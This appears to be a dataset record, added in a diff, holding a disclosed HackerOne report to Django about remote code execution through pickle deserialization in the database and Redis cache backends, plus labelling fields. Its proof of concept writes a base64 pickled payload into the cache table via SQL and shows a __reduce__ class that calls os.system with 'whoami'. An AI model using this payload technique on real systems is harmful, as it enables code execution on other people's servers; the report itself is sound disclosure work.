@@ -1,0 +1,46 @@
+{
+  "reported_to": "Django",
+  "reported_by": "scaramouche31 ",
+  "title": "Deserialization of potentially malicious data to RCE",
+  "content": "\nHello, Django Team! It's my first time working with you, hope it will be great!\nNote: I have not seen this issue neither in known vulnerabilities nor in documentation, so here I am.\nSummary\nSeveral type of caches in https://github.com/django/django/tree/main/django/core/cache/backends use python pickle which may result in RCE (basically privilege escalation) in case attacker will takeover a machine/container with cache.\nSo, 4 types of cache use pickle.load directly or under the hood:\nLocmem - I don't consider it as a big issue, because locmem uses some random part of memory for cache taken by Python while the server runs + it is unlikely to be used in production.\nFilebased - I don't consider it as an issue, because if you control the file with cache, it is likely that you control the machine where Django runs + this behaviour is mentioned in the documentation (https://docs.djangoproject.com/en/3.2/topics/cache/):\nCode 191 Bytes\n1An attacker who gains access to the cache file can not only falsify HTML content, which your site will trust, but also remotely execute arbitrary code, as the data is serialized using pickle.\nDatabase - this time I consider this as an issue, because a Django app and db are pretty likely running on different machines/containers. So in case attacker gains access to db, a door to privilege escalation via RCE on other machine is open.\nRedis - though it was not released yet, it's already supported in dev version from source. Same thoughts here - Redis is likely to run in a separated environment.\nPoC, steps to reproduce:\nI'm providing it for a db based cache, as Redis support is not officially released yet if I'm not mistaking\nFor an ease of PoC I will use sqlite3 on the same machine, but you of course may run a separate database.\nCreate a Django project, make some simple app.\nAdd this to settings.py:\nCode 349 Bytes\n1MIDDLEWARE = [\n2    'django.middleware.cache.UpdateCacheMiddleware',\n3    ...\n4    'django.middleware.cache.FetchFromCacheMiddleware',\n5]\n6...\n7CACHE_MIDDLEWARE_ALIAS = 'default'\n8CACHE_MIDDLEWARE_KEY_PREFIX = ''\n9...\n10CACHES = {\n11    'default': {\n12        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',\n13        'LOCATION': 'my_cache_table',\n14    }\n15}\nRun the server, visit your app's page to create a cache entry;\nIn your shell run: sqlite3 db.sqlite3\nRun SELECT * FROM my_cache_table; to find a row which stores the cached page (it was the second one in my case).\nRun UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' where rowid=2; with the id of your row,\nReload the web page.\nObserve command execution in the server logs.\ngASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4= is a base64 version of pickled RCE payload:\nCode 112 Bytes\n1class Pwner:\n2    def __reduce__(self):\n3        import os\n4        cmd = \"whoami\"\n5        return os.system, (cmd,)\nReference\nAs a reference I'm leaving a very same issue in Flask:\nhttps://vulmon.com/vulnerabilitydetails?qid=CVE-2021-33026&scoretype=cvssv2\nAttack scenario:\nAttacker gains an access to machine/container with cache instance.\nAttacker now can run arbitrary code on machine with running Django server.\nImpact\nRCE, full machine takeover\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Deserialization of Untrusted Data"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1642196040,
+  "report_url": "https://hackerone.com/reports/1415436",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Create a Django project with a simple app and configure database cache in settings.py"
+    ],
+    [
+      2,
+      "Run the server, visit the app's page to create a cache entry"
+    ],
+    [
+      3,
+      "Use sqlite3 to update the cache table with a malicious pickled payload"
+    ],
+    [
+      4,
+      "Reload the web page to observe command execution in server logs"
+    ]
+  ],
+  "vuln_description": "The vulnerability involves deserialization of potentially malicious data in Django's cache backends (specifically Database and Redis) using Python's pickle, which can lead to Remote Code Execution (RCE) if an attacker gains access to the cache storage.",
+  "reason": "The attack requires understanding of Django's cache mechanisms, pickle serialization vulnerabilities, and the ability to manipulate cache data. However, the steps to exploit are straightforward once these components are understood, and similar vulnerabilities are well-documented in other contexts (like Flask).",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
